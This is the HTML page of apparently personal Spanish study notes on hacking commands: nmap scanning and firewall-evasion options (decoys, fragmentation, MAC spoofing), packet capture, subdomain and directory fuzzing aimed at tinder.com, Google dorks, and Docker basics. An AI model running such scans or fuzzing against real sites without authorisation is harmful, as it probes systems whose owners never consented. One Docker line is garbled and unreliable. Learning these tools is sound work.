@@ -1,0 +1,1054 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://FabCAdev.github.io/Apuntes_Hacking/Por%20Organizar/Comandos_Hacking/">
+      
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.4">
+    
+    
+      
+        <title>Comandos basicos - Apuntes de Hacking de FabCAdev</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.8608ea7d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#comandos-basicos" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../.." title="Apuntes de Hacking de FabCAdev" class="md-header__button md-logo" aria-label="Apuntes de Hacking de FabCAdev" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Apuntes de Hacking de FabCAdev
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Comandos basicos
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="cyan"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="cyan"  aria-hidden="true"  type="radio" name="__palette" id="__palette_1">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Pestañas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+    
+  
+  🛡️ HACKING
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../AVANCES/%F0%9F%93%88%20AVANCES/" class="md-tabs__link">
+          
+  
+  📈 AVANCES
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../CAPTURE%20THE%20FLAG/CAPTURE%20THE%20FLAG/" class="md-tabs__link">
+          
+  
+  🚩 CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../ENCICLOPEDIA/%F0%9F%93%96%20ENCICLOPEDIA/" class="md-tabs__link">
+          
+  
+  📖 ENCICLOPEDIA
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Apuntes de Hacking de FabCAdev" class="md-nav__button md-logo" aria-label="Apuntes de Hacking de FabCAdev" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Apuntes de Hacking de FabCAdev
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    🛡️ HACKING
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    📈 AVANCES
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            📈 AVANCES
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AVANCES/%F0%9F%93%88%20AVANCES/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mis Avances
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    🚩 CTF
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            🚩 CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CAPTURE%20THE%20FLAG/CAPTURE%20THE%20FLAG/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Laboratorios
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    📖 ENCICLOPEDIA
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            📖 ENCICLOPEDIA
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ENCICLOPEDIA/%F0%9F%93%96%20ENCICLOPEDIA/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enciclopedia Principal
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#macchanger" class="md-nav__link">
+    <span class="md-ellipsis">
+      Macchanger
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#redes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Redes
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#subdominio" class="md-nav__link">
+    <span class="md-ellipsis">
+      Subdominio
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fuzzing
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#google-dorxs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Google Dorxs
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docker" class="md-nav__link">
+    <span class="md-ellipsis">
+      Docker
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeracion-de-servicio" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeracion de servicio
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payloads-con-ncat-y-meterpreter" class="md-nav__link">
+    <span class="md-ellipsis">
+      Payloads con Ncat y Meterpreter
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#101-comandos-dentro-de-sesion-activa-de-meterpreter" class="md-nav__link">
+    <span class="md-ellipsis">
+      10.1 Comandos dentro de sesion activa de Meterpreter
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeracion-de-sistema-con-lse" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeracion de sistema con lse
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerabilidad-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerabilidad SQL Injection
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="comandos-basicos">Comandos basicos</h1>
+<p>Etiquetas: #hacking #comandos #nmap #macchanger #fuzzing #docker #sql-injection #meterpreter</p>
+<p>ip a</p>
+<p>Ver tus tarjetas de red con las IP, MAC, entre otros</p>
+<p>man [programa]</p>
+<p>Ver el manual de un programa</p>
+<p>man nmap</p>
+<p>Ver el manual del programa nmap</p>
+<p>timeout 1 bash -c "ping -c 1 192.168.1.1" &amp;&gt;/dev/null</p>
+<p>Envia 1 ping a la direccion IP objetiva, antes del ping se le añadio un timeout para detener el comando despues de x segundos en caso de que el host no responda y el &amp;&gt;/dev/null para no poner errores en la consola</p>
+<p>Nota</p>
+<p>Los programas que se ejecutar en la terminal como nmap tiene su propia terminal, donde muestran una guia rapida de comandos</p>
+<h2 id="macchanger">Macchanger</h2>
+<p>macchanger -l | grep -i [nombre de la empresa]</p>
+<p>Abre macchanger, con -l hace una lista de las direcciones MAC de las empresas (OUI) y se filtra por el nombre deseado a buscar</p>
+<p>macchanger -l | grep -i [VMware]</p>
+<p>Muestra todas las OUI de la empresa VMware</p>
+<h2 id="nmap">Nmap</h2>
+<p>nmap [puerto(s)] [ip (primer host)] [atributos/parametros]</p>
+<p>Escaneo de redes especificando la IP a usar, lo mas recomendable es usar el primer host de la IP debido a que se aloja el router. Este escaneo encontrara los puertos abriertos asi como la direccion MAC</p>
+<p>nmap -p- 192.168.100.1</p>
+<p>Hace un repote del escaneo a la IP asignada, este usa la del primer host debido que ahi se aloja el router, poniendo -p- especificas escanear todos los puertos</p>
+<p>nmap --top-ports 500 192.168.100.1</p>
+<p>Poniendo top ports especificas que solo haga un escaneo de los puertos mas usados, en este caso los 500 puertos</p>
+<p>nmap --top-ports 500 --open 192.168.100.1</p>
+<p>Especificas solo puertos abiertos</p>
+<p>nmap -p- 192.168.100.1 -v</p>
+<p>Con verbose especificas que te muestre informacion mientras se hace el escaneo</p>
+<p>nmap -p- 192.168.100.1 -v -n</p>
+<p>Con -n No haces resolucion DNS</p>
+<p>nmap -p- -T5 --open 192.168.100.1 -v</p>
+<p>Ajusta velocidades de escaneo con -T, estos pueden ser desde T0 (escaneo mas sigiloso posible) hasta T5 [muy rapido)</p>
+<p>nmap -p22 -sT --open 192.168.100.1 -v -n</p>
+<p>Con -sT usa el modo de escaneo TCP usando el metodo Three-Way Handshake</p>
+<p>nmap -p- -T5 --open 192.168.100.1 -v -n -Pn</p>
+<p>Usando -Pn, se hace el escaneo sin verificar antes si el Host esta encendido o funciona</p>
+<p>nmap -p- --open 192.168.100.1 -v -n -sU</p>
+<p>A diferencia de -Pn, -sU escanea con UDP</p>
+<p>nmap -sn 192.168.100.0/24</p>
+<p>Verifica los dispositivos conectado a una misma red con -sn,</p>
+<p>nmap -sn 192.168.100.0/24 | grep -oP '\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' | sort</p>
+<p>Aparte de verificar tambien imprime y ordena las Ips con grep y sort</p>
+<p>nmap -O 192.168.100.75;</p>
+<p>Verifica que sistema operativo usa, su direccion MAC, puerto abierto para transferir con -O</p>
+<p>nmap -p22,80 -sV 192.168.100.1</p>
+<p>Con -sV lanza mas peticiones a los puertos especificos para obtener la version exacta del puerto corriendo</p>
+<p>nmap -p22 192.168.100.1 -f</p>
+<p>Fragmenta los paquetes con -f para que despues el destinatario reconstruya los paquetes dependiendo de las reglas de su firewall, los fragmenta en 8 bytes</p>
+<p>nmap -p22 192.168.100.1 --mtu</p>
+<p>Personalizando la fragmentacion de bytes se usa -mtu, puede ser 8, 16, 32, 64, 128, etc.??</p>
+<p>nmap -p22 192.168.100.1 -D 192.168.100.215</p>
+<p>El Decoy Scan se hace con -D, envia paquetes desde la IP real y a la vez en uno falso usado de señuelo</p>
+<p>nmap -p22 192.168.100.1 --data-length 21</p>
+<p>Añade un longitud de datos mayor al paquete de datos usando --data-length</p>
+<p>nmap -p22 192.168.100.1 --spoof-mac Dell -Pn</p>
+<p>Cambia la direccion MAC en el paquete de datos con --spoof-mac, usando una de Dell</p>
+<p>nmap -p22 192.168.100.1 --spoof-mac 00:11:22:33:44:55 -Pn</p>
+<p>Tambien se permite usar una direccion MAC personalizado</p>
+<p>nmap -p- --open -sS --min-rate 5000 -v -n -Pn 192.168.100.1</p>
+<p>Ahora este contiene -sS y –min-rate. El -sS realiza escaneo tipo SYN sin establecer una coneccion completa, evitando el Firewall. Mientras que –min-rate se permite controlar la velocidad del manejo de los paquetes evitando que el Firewall detecte anomalias de manipulacion de paquetes</p>
+<p>nmap -p22 192.168.100.1 -sC -sV</p>
+<p>Con el parametro -sC podras ejecutar diversos scripts de nmap, estos se ubica en /usr/share/nmap/scripts/. Los scripts a ejecutar vendrian siendo pocos, en donde estos sean rapidos de ejecutar, puedan extraer informacion valiosa o datos comunes, y no romper nada o realizar ataques de fuerza bruta pesados</p>
+<p>nmap -p22 192.168.100.1 -sCV</p>
+<p>Ejecita -sC y -sV al mismo tiempo con -sCV</p>
+<p>locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u</p>
+<p>Muestra todas las categorias que existen en los scripts de nmap</p>
+<p>nmap -p22 192.168.100.1 –script=”vuln and safe” -sV</p>
+<p>Si quieres ejecutar scripts mas especificos se puede usar –script, en este caso al poner “vuln and safe” nmap usara los scripts default que se usan en esas 2 categorias</p>
+<p>nmap -p80 192.168.100.75 --script http-enum -sV</p>
+<p>Ejecutacion de un script en especifico, en este caso el http-enum</p>
+<h2 id="redes">Redes</h2>
+<p>tcpdump -i wlan0 -w Captura.cap -v</p>
+<p>Analiza paquetes de datos en la red al igual que Wireshark pero sin graficos, indicando la interfaz con -i y guardar los datos en un archivo con -w</p>
+<p>sudo tcpdump -i lo -w Captura.cap -v</p>
+<p>Analizando paquetes de datos pero en pa loopback</p>
+<p>wireshark Captura.cap &amp;&gt;/dev/null &amp; disown</p>
+<p>Puedes Abrir la captura que tomaste con wireshark y asi tener un vistaso grafico del analisis obtenido</p>
+<p>tshark -r Captura.cap 2&gt;/dev/null</p>
+<p>Tshark es la alternativa a Wireshark en la terminal</p>
+<p>tshark -r Captura.cap -Y "http" 2&gt;/dev/null | grep "GET"</p>
+<p>Filtra usando el atributo -Y, si quieres ver informacion mas especifica lo puedes combinar con grep</p>
+<p>tshark -r Captura.cap -Y "http" 2&gt;/dev/null -Tfields -e tcp.payload | xxd -ps -r | grep “GET” | awk ‘{print $2}’</p>
+<p>con -Tfields y -e puedes extraer los datos del campo especifico, ya sea tanto la peticion como la respuesta, como se entregan los datos en puro hexadecimal pues usas xxd para convertirlo a ASCII, leyendo los datos con -ps y hacer la conversion inversa con -r</p>
+<p>arp-scan -I wlan0 --localnet –ignoredups</p>
+<p>netdiscover -i wlan0</p>
+<p>Verifica que otros dispositivos estan conectados en la misma red, con -ignoredups ignoras fuplicados. Esto es lo mismo que el atributo -sN en nmap</p>
+<p>sudo masscan -p21,22,139,445,8080,80,443 -Pn 192.168.0.0/16 --rate=10000;</p>
+<p>Es lo parecido al atributo de -sN de nmap, pero a diferencia de nmap que suele hacer escaneos de manera sigilosa, masscan se encarga de hacer grandes y rapidos escaneos, a manera de una verificacion rapida, puedes hacer escaneos a Ips de Clase B, especificando los puertos a escanear y ajustando la velocidad del escaneo con --rate</p>
+<p>nmap --script ftp-anon -p21 127.0.0.1</p>
+<h2 id="subdominio">Subdominio</h2>
+<p>gobuster vhost -u https://tinder.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 –append-domain | grep -v "403"</p>
+<p>Busca Virtual Hosts con Gobuster, con -u defines la URL del objetivo, con -w el diccionario a usar, con -t los hilos (peticiones simultaneas), poniendo –append-domain para mostrar paginas accesibes y por ultimo poniendo grep con -v indicas mostrar todo excepto el status de 403 prohibido</p>
+<p>wfuzz -c -t 20 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc 403,404 -H "Host: FUZZ.tinder.com" http://tinder.com/</p>
+<p>Mismo uso con wfuzz, siendo mas flexible que gobuster permitiendo meter el diccionario FUZZ en cualquier parte de la peticion HTTP, con -c imprime los codigos de estado con color dando decoracion, se implementa hilos con -t, asi como la ruta del diccionario con -w, con –hc el filtro de salida que no salga 403 ni 404, con -H que es lo que quieres modificar especificando el subdominio, y por ultimo se coloca el objetivo</p>
+<p>python3 /opt/Sublist3r/sublist3r.py -d tinder.com;</p>
+<p>Ahora con Sublist3r, en este caso se dirige a su archivo .py y se especifica la dirreccion con -d</p>
+<h2 id="fuzzing">Fuzzing</h2>
+<p>gobuster dir -u https://tinder.com/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 --exclude-length 505875 --add-slash -b 403,404 -x php,html,txt</p>
+<p>Busca rutas de una pagina con gobuster, especificando con dir en vez de vhost, usa -u para la direccion de la pagina, -w para el diccionario, -t para hilos, con –exclude-length ignoras el mensaje del archivo que pesa lo indicado, pues es un falso positivo que envia al servidor indicando que todas las rutas existe. Con –add-slash es agregar un / al final de cada palabra del diccionario, y con -x especificamos extensiones, por cada modulo y direccion tambien agregara las extensiones especificadas como php, html y txt.</p>
+<p>wfuzz -c --hc=404,403 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://tinder.com/FUZZ;</p>
+<p>Lo mismo pero con wfuzz, especificas con “FUZZ” despues de la direccion web y no antes como los subdominios</p>
+<p>wfuzz -c --sl=38 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://tinder.com/FUZZ</p>
+<p>Parametro --sl para mostrar resultados con un numero especifico de lineas</p>
+<p>wfuzz -c --hl=38 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://tinder.com/FUZZ</p>
+<p>Parametro –hl para mostrar resultados que no sean un numero especifico de lineas</p>
+<p>wfuzz -c -t 50 --conn-delay 1 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -z list,html-txt-js --hc 403,404,429 https://tinder.com/FUZZ.FUZ2Z;</p>
+<p>Con el parametro -z hace las busquedas de los modulos pero con las extensiones añadidas, cabe aclarar que como es un segundo payload se le tiene que agregar “FUZ2Z”, “FUZ3Z” para el tercer payload y asi sucecivamente. Usando --conn-delay es un tiempo de retrazo, fundamental para que no se vaya a bloquear la IP tan rapido</p>
+<h2 id="google-dorxs">Google Dorxs</h2>
+<p>site:[pagina]</p>
+<p>Mostrar solamente resultados de esa pagina</p>
+<p>site:tinder.com</p>
+<p>Mostrar solamente resultados de la pagina de tinder</p>
+<p>filetype:[tipo de archivo]</p>
+<p>Mostrar solamente una extension de archivo especifico</p>
+<p>intitle:[palabra clave]</p>
+<p>Busca palabras clave dentro del título de la página web.</p>
+<p>inurl:[modulo en la pagina]</p>
+<p>Busca palabras que estén dentro de la dirección URL.</p>
+<p>intext:[palabra clave]</p>
+<p>Busca palabras clave dentro del contenido de la página.</p>
+<p>-</p>
+<p>Excluye resultados</p>
+<p>cache:[pagina]</p>
+<p>Muestra la versión guardada por Google (si la web bajó).</p>
+<p>link:[link]</p>
+<p>Busca páginas que tengan enlaces hacia ese sitio.</p>
+<p>site:*.tinder.com</p>
+<p>Comodín que sustituye cualquier palabra.</p>
+<h2 id="docker">Docker</h2>
+<p>FROM [SO:[version]]</p>
+<p>MAINTAINER [nombre]</p>
+<p>RUN [comando]</p>
+<p>EXPOSE [puerto]</p>
+<p>ENTRYPOINT [servicio]</p>
+<p>Elementos que debe de tener el dockerimage, pues en FROM se especifica la version en si del SO mientras que MAINTAINER el Autor. Con Run puedes ejecutar un comando al momento de correr el contenedor, con EXPOSE abres un puerto, con ENTRYPOINT abres un servicio</p>
+<p>FROM ubuntu:latest</p>
+<p>MAINTAINER FabCA</p>
+<p>RUN apt update &amp;&amp; apt install -y net-tools \ apache2</p>
+<p>EXPOSE 80</p>
+<p>ENTRYPOINT service apache2 start</p>
+<p>Se especifica el tipo de SO ubuntu, y con latest se especifica la ultima version, el maintainer nombre o apodo del autor, con RUN siempre se ejecuta apt update y apt install, con EXPOSE abres el puerto 80 y con ENTRYPOINT abres un servicio</p>
+<p>docker build -t [nombre] [ruta]</p>
+<p>docker build -t my_first_image .</p>
+<p>Construccion de una imagen docker, usando -t para especificar el nombre, siempre cada modificacion que se haga se guarda con un build y la imagen donde se estuvo trabajando</p>
+<p>docker images</p>
+<p>Ver todos tus repositorios de imagenes docker</p>
+<p>docker pull debian:latest</p>
+<p>Importa un SO y sus dependencias a instalar, en este caso debian</p>
+<p>docker run -dit –name myContainer my_first_image</p>
+<p>Ejecuta un contenedor de docker, usa atributos como -d para correr en segundo plano, -i para que sea interactivo y -t para permitir el uso de</p>
+<p>una consola virtual, se usa --name para ponerle nombre del contenedor y despues se especifica ruta de la imagen de docker. El run solo se usa para ejecutar por primera vez</p>
+<p>docker ps -a</p>
+<p>docker ps -q</p>
+<p>docker ps</p>
+<p>Muestra el o los contenedores ejecutandose actualmente, puedes usar -a para listar todos los contenedores, o -q solo mostrando los ID de los contenedores</p>
+<p>docker exec -it myContainer bash</p>
+<p>Ejecutar un comando dentro del contenedor activo, con -i de interactivo y -t de consola virtual, con bash ejecuta la terminal bash</p>
+<p>docker stop [nombre/ID]</p>
+<p>Detiene un contenedor Docker</p>
+<p>docker rm [nombre]</p>
+<p>Borra un contenedor</p>
+<p>docker rm $(docker ps -a -q) --force</p>
+<p>Borra todos los contenedores a la vez , usando --force permite detenerlo automaticamente</p>
+<p>docker rmi [nombre/ID]</p>
+<p>docker rmi one piece sad song(docker images -q)</p>
+<p>Borra tuna imagen de Docker</p>
+<p>docker rmi $(docker images --filter "dangling=true" -q)</p>
+<p>Borra contenedores donde no tengan nombre o etiqueta, como limpieza de corrupcion</p>
+<p>docker run -dit -p 80:80 --name myWebServer ubuntu_image</p>
+<p>Corre un contenedor pero aplicas forwarding para que el puerto 80 de la PC principal sea el puerto 80 del contenedor</p>
+<p>docker start [nombre]</p>
+<p>docker start myWebServer</p>
